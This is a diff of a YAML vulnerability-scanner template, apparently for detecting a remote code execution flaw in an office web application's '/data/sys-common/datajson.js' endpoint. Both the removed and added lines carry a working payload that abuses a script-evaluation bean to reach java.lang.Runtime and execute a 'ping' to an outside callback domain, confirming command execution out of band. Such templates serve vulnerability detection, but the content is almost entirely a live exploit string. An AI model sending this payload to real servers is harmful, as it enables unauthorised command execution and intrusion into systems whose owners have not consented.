@@ -8,11 +8,11 @@
 
 #漏洞的位置
 - url:
-  - url : "/data/sys-common/datajson.js"
+  - url : '''/data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec('ping -c 4 cd1d5369.ipv6.1433.eu.org')'''
 
 #payload
 - payload:
-  - payload: 's_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec("ping -c 4 cd1d5369.ipv6.1433.eu.org")'
+  - payload: 'isNone'
 
 #response包里状态码
 - status:
